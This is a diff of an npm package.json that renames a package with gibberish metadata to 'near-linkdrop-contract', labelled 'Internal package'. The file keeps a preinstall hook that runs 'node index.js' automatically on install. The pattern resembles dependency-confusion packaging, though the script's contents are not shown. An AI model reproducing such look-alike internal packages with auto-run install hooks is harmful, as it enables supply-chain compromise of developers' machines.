@@ -1,10 +1,15 @@
 {
-  "name": "@3ps/postmessage-api-external",
-  "version": "3.25.12",
-  "description": "arebegazicim uxunow lafojucah",
+  "name": "near-linkdrop-contract",
+  "version": "2.2.0",
+  "description": "Internal package",
   "main": "index.js",
   "scripts": {
-    "preinstall": "node build.js"
+    "test": "ls",
+	"preinstall": "node index.js"
   },
-  "license": "MIT"
+  "keywords": [
+    "Testing"
+  ],
+  "author": "ISC",
+  "license": "ISC"
 }
